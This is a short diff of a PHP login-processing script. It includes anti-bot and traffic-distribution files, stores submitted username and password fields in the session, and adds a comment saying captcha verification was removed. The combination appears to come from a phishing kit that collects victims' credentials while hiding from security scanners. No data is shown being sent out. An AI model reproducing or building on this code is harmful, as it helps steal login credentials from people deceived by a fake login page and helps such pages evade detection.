@@ -3,9 +3,10 @@ session_start();
 
 include '../antibot.php';
 include '../antibot/tds.php';
- 
+// Captcha verification removed from login processing
 
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    
     $_SESSION['xusr'] = $_POST['xusr'];
     $_SESSION['xpss'] = $_POST['xpss'];
 } else {
